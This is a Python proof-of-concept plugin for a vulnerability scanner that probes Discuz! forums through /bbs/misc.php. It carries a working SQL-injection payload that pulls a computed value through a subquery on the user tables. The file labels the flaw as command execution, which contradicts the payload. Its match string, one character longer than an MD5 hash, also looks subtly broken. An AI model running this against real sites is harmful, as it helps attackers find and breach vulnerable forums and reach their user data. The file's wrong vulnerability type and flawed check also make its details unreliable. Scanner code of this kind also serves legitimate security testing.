# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Discuz_0024'  # 平台漏洞编号，留空
    name = 'Discuz! 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        Discuz! /bbs/misc.php 命令执行漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ac60f974-0236-44ef-81fa-9372aca9f194'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=password`as%20statistic%20(select%20(select%20md5(12345)%20from%20pre_common_statuser,pre_ucenter_members%20as' 
            verify_url = arg + payload 
            code, head,res, errcode, _ = hh.http(verify_url) 
            if code == 200 and "827ccb0eea8a706c4c34a16891f84e7b1" in res:
                #security_hole(verify_url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
